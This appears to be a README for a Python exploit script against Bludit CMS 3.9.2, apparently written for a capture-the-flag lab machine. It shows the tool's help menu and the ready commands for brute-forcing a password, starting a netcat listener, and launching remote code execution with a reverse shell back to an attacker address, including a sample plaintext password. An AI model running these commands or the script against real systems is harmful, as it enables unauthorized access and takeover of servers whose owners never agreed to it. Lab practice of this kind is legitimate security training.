
# Bludit CMS 3.9.2 Exploitation script 

## help menu 

```
 $ ./exploit.py -h
usage: exploit.py [-h] -r RHOST [-rp RPORT] [-l LHOST] [-lp LPORT] -u USERNAME
                  [-p PASSWORD] [-b] [-w WORDLIST]

optional arguments:
  -h, --help            show this help message and exit

BruteForcing:
  -b, --brute           Brute force the password
  -w WORDLIST, --wordlist WORDLIST
                        WordList file name

Authentication:
  -u USERNAME, --username USERNAME
                        Enter the Username
  -p PASSWORD, --password PASSWORD
                        Enter the Password

Remote Network:
  -r RHOST, --rhost RHOST
                        Remote IP Address
  -rp RPORT, --rport RPORT
                        Remote Port Number

Local Network:
  -l LHOST, --lhost LHOST
                        Remote IP Address
  -lp LPORT, --lport LPORT
                        Locale NetCat Port

```
### Brute Forcing 

```

$ ./exploit.py -r 10.10.10.191 -u fergus -w wordlist -b

```

### Exploit RCE

```
$ nc -nvlp 4443
```


```

$ ./exploit.py -r 10.10.10.191 -u fergus -p RolandDeschain -l 10.10.16.12 -lp 4443

```
